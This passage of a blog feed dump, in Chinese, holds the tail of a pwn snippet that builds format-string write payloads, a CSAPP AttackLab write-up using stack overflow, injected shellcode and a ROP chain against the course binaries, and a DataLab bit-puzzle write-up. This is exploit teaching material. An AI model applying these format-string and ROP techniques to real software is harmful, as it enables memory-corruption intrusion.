<span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 3:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low3 = (after_change &amp; 0xff0000) &gt;&gt; 16&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c3 = (low3 - low2 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg3 = location_arg2 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c3) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg3) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x2)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 4:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low3 = (after_change &amp; 0xff0000) &gt;&gt; 16&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low4 = (after_change &amp; 0xff000000) &gt;&gt; 24&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c3 = (low3 - low2 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c4 = (low4 - low3 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg3 = location_arg2 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg4 = location_arg3 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c3) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg3) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c4) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg4) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x2)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x3)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 5:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low3 = (after_change &amp; 0xff0000) &gt;&gt; 16&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low4 = (after_change &amp; 0xff000000) &gt;&gt; 24&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low5 = (after_change &amp; 0xff00000000) &gt;&gt; 32&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c3 = (low3 - low2 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c4 = (low4 - low3 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c5 = (low5 - low4 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg3 = location_arg2 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg4 = location_arg3 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg5 = location_arg4 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c3) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg3) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c4) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg4) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c5) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg5) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x2)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x3)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x4)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 6:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low3 = (after_change &amp; 0xff0000) &gt;&gt; 16&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low4 = (after_change &amp; 0xff000000) &gt;&gt; 24&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low5 = (after_change &amp; 0xff00000000) &gt;&gt; 32&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low6 = (after_change &amp; 0xff0000000000) &gt;&gt; 40&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c3 = (low3 - low2 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c4 = (low4 - low3 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c5 = (low5 - low4 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c6 = (low6 - low5 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg3 = location_arg2 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg4 = location_arg3 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg5 = location_arg4 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg6 = location_arg5 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c3) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg3) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c4) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg4) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c5) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg5) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c6) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg6) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x2)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x3)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x4)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x5)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    return payload&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://lingze.xyz/book/pwn/env/">https://lingze.xyz/book/pwn/env/</a></li><li><a href="https://blog.sigmerc.top/post/PwnTemplate/">https://blog.sigmerc.top/post/PwnTemplate/</a></li><li><a href="https://code.visualstudio.com/docs/editor/userdefinedsnippets">https://code.visualstudio.com/docs/editor/userdefinedsnippets</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AttackLab</title>
      <link href="2021/07/18/AttackLab/"/>
      <url>2021/07/18/AttackLab/</url>
      
        <content type="html"><![CDATA[<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="touch1"><a href="#touch1" class="headerlink" title="touch1"></a>touch1</h2><p><img src="https://i.loli.net/2021/07/18/eP4hAwgymJpYRLi.png" alt=""></p><p>结合汇编代码可以确定返回地址距离我们输入的buf距离为0x28，查看Gets函数如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">Gets</span><span class="params">(<span class="keyword">char</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  gets_cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = dest; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = _IO_getc(infile);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">-1</span> || v2 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *i = v2;</span><br><span class="line">    save_char(v2);</span><br><span class="line">  &#125;</span><br><span class="line">  *i = <span class="number">0</span>;</span><br><span class="line">  save_term();</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以输入任意数量的字符</p><p>那就好办了，我们使用附件里的hex2raw文件构造输入，再用管道符输入到文件中即可</p><p>payload和attack效果如下:</p><p><img src="https://i.loli.net/2021/07/18/8xLTPegmUZyAs3i.png" alt=""></p><h2 id="touch2"><a href="#touch2" class="headerlink" title="touch2"></a>touch2</h2><p>不看IDA反汇编出来的伪代码了，感觉有点欺负人2333，直接objdump好了</p><p>从网上整了个nm配合objdump来反汇编指定函数的jio本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">vmlinux=<span class="variable">$1</span> </span><br><span class="line">symbol=<span class="variable">$2</span> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$vmlinux</span>&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;usage : <span class="variable">$0</span> vmlinux symbol&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> </span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"> </span><br><span class="line">startaddress=$(nm -n <span class="variable">$vmlinux</span> | grep <span class="string">&quot;\w\s<span class="variable">$symbol</span>&quot;</span> | awk <span class="string">&#x27;&#123;print &quot;0x&quot;$1;exit&#125;&#x27;</span>) </span><br><span class="line">endaddress=$(nm -n <span class="variable">$vmlinux</span> | grep -A1 <span class="string">&quot;\w\s<span class="variable">$symbol</span>&quot;</span> | awk <span class="string">&#x27;&#123;getline; print &quot;0x&quot;$1;exit&#125;&#x27;</span>) </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$symbol</span>&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;dump all symbol&quot;</span></span><br><span class="line">    objdump -d <span class="variable">$vmlinux</span> </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;start-address: <span class="variable">$startaddress</span>, end-address: <span class="variable">$endaddress</span>&quot;</span> </span><br><span class="line">    objdump -d <span class="variable">$vmlinux</span> --start-address=<span class="variable">$startaddress</span> --stop-address=<span class="variable">$endaddress</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>直接进touch2函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start-address: 0x00000000004017ec, end-address: 0x000000000040184c</span><br><span class="line"></span><br><span class="line">ctarget:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4017f0:89 fa                mov    %edi,%edx</span><br><span class="line">  4017f2:c7 05 e0 2c 20 00 02 movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:00 00 00 </span><br><span class="line">  4017fc:3b 3d e2 2c 20 00    cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:75 20                jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:be e8 30 40 00       mov    $0x4030e8,%esi</span><br><span class="line">  401809:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  40180e:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401813:e8 d8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:bf 02 00 00 00       mov    $0x2,%edi</span><br><span class="line">  40181d:e8 6b 04 00 00       callq  401c8d &lt;validate&gt;</span><br><span class="line">  401822:eb 1e                jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:be 10 31 40 00       mov    $0x403110,%esi</span><br><span class="line">  401829:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  40182e:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401833:e8 b8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:bf 02 00 00 00       mov    $0x2,%edi</span><br><span class="line">  40183d:e8 0d 05 00 00       callq  401d4f &lt;fail&gt;</span><br><span class="line">  401842:bf 00 00 00 00       mov    $0x0,%edi</span><br><span class="line">  401847:e8 f4 f5 ff ff       callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>查看两个printf的参数，分别输出如下</p><p><img src="https://i.loli.net/2021/07/18/iLu5wCNo9Dnk4fZ.png" alt=""></p><p>那么即我们得让传入的参数和cookie相等，再跳转到touch2</p><p><img src="https://i.loli.net/2021/07/18/7yZxrT24QwUn8K9.png" alt=""></p><p>经过调试发现我们rsp的地址是mmap出来的一块具有RWX权限的地址，那么这下就很简单了，直接能够执行代码了属于是，那👴🏻直接写汇编进去，再做一次ret</p><p>使用pwntools的命令行工具来生成汇编代码的二进制形式</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pwn asm  <span class="string">&#x27;mov rdi,0x59b997fa; ret&#x27;</span>  -c amd64 -c little</span><br><span class="line">48c7c7fa97b959c3</span><br></pre></td></tr></table></figure><p>验证一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pwn disasm 48c7c7fa97b959c3 -c amd64</span><br><span class="line">   0:    48 c7 c7 fa 97 b9 59     mov    rdi,  0x59b997fa</span><br><span class="line">   7:    c3                       ret</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/18/63tK5rOUPTQs9uC.png" alt=""></p><p>这。。。应该是成功了吧，毕竟没有Misfile，不知道下面的FAIL啥意思</p><h2 id="touch3"><a href="#touch3" class="headerlink" title="touch3"></a>touch3</h2><p>ida反编译出来的hexmatch函数是什么玩意，看的一头雾水，参考了一下wp，发现不同大佬的wp中都直接有源码（从哪搞的。。）</p><p><img src="https://i.loli.net/2021/07/18/btuhGr1vaXEzqsQ.png" alt=""></p><p>那就是比较字符串是否相同呗，传个地址进入，这个地址需要指向cookie</p><p>就多绕了个弯，和touch2差不多</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pwn asm  <span class="string">&#x27;mov rdi,0x5561dcb0;push 0x4018fa;ret&#x27;</span>  -c amd64 -c little</span><br><span class="line">48c7c7b0dc615568fa184000c3</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/18/HczPui42NJO63jB.png" alt=""></p><h2 id="rop2"><a href="#rop2" class="headerlink" title="rop2"></a>rop2</h2><p>rop系列栈无法执行，那么就用我们熟悉的rop来搞</p><p>首先是touch2（touch1跟之前那个没啥不一样的）</p><p>直接ROPgadget一把梭</p><p><img src="https://i.loli.net/2021/07/18/LHjT5YSAfP6hsla.png" alt=""></p><p>payload就是<code>pop_rdi_ret + cookie + touch2_address</code></p><p><img src="https://i.loli.net/2021/07/18/9djsK5fhUkGD8JS.png" alt=""></p><h2 id="rop3"><a href="#rop3" class="headerlink" title="rop3"></a>rop3</h2><p>卡住了，算偏移的时候算错了QAQ，大体思路采用一个大佬的图片</p><p><img src="https://i.loli.net/2021/07/18/RlG8pJHzBh1N72C.png" alt=""></p><p>其中add_xy是farm里自带的函数，在rtarget中含有</p><p><img src="https://i.loli.net/2021/07/18/hHrwgfzcTMeoy6O.png" alt=""></p><h1 id="总结反馈"><a href="#总结反馈" class="headerlink" title="总结反馈"></a>总结反馈</h1><ol><li>gdb调试带参数文件，set args -q，其中”-q”为参数</li><li>objdump 配合 nm 反汇编出某个指定函数</li><li>pwn asm 命令行工具生成二进制汇编数据，其中-c指定形式，默认linux/i386</li><li>二进制数据可以用管道符来输入到文件</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> csapp </tag>
            
            <tag> cmu lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DataLab</title>
      <link href="2021/07/10/DataLab/"/>
      <url>2021/07/10/DataLab/</url>
      
        <content type="html"><![CDATA[<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h2><p>思路比较简单，即使用~和&amp;实现异或<br>异或即相同为0不同为1<br>Y = ~AB + ~BA即可实现<br>然后把或通过德摩根律变成与即可实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(~(~x &amp; y) &amp; ~(x &amp; ~y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h2><p>补码的最小二进制数就是最高位1其余为0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h2><p>因为返回值只有0和1，所以考虑最后肯定是使用!运算符来实现<br>然后考虑最大数独有的特点，即0x7fffffff + 1 = 0x80000000 = -2147483648<br>所以 0x80000000 + 0x7fffffff = -1<br>所以 0x80000000 + 0x7fffffff + 1 = -1 + 1 = 0<br>所以 !(0x80000000 + 0x7fffffff + 1) = !(-1 + 1) = 1<br>综上即 !((x + 1) + x + 1)<br>这个式子看着就很诡异，只有边界值才满足，但是少考虑了最小边界值0和-1的情况（出错后才意识到），所以加个和0x7fffffff相与的操作即可避免0xffffffff的情况</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !(((x + <span class="number">1</span>) + (x &amp; <span class="number">0x7fffffff</span>)) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h2><p>奇数位全为1才能是1，那么0x0 - 0xF 中，只有0xA, 0xB, 0xE, 0xF才满足，即这个数字最小的是0xAAAAAAAA，那么无论这个数是多少，只要满足这个条件，其与0xAAAAAAAA相与后，偶数位一定为0（AH = 1010B），所以如果设这个数满足要求，则与0xAAAAAAAA与运算后，其值一定是0xAAAAAAAA，那么再与0xAAAAAAAA异或后，其值一定为0，取反则为1；反之，不满足要求，其值为0。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// a b e f</span></span><br><span class="line">  <span class="keyword">return</span> !((x &amp; <span class="number">0xAAAAAAAA</span>) ^ <span class="number">0xAAAAAAAA</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><p>无论从二进制数上推还是凭感觉硬试，都挺简单的，以8位来举个例子</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5:  00000101</span><br><span class="line">-5: 11111011</span><br></pre></td></tr></table></figure><p>无论正数还是负数都等于原来的取反 + 1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" 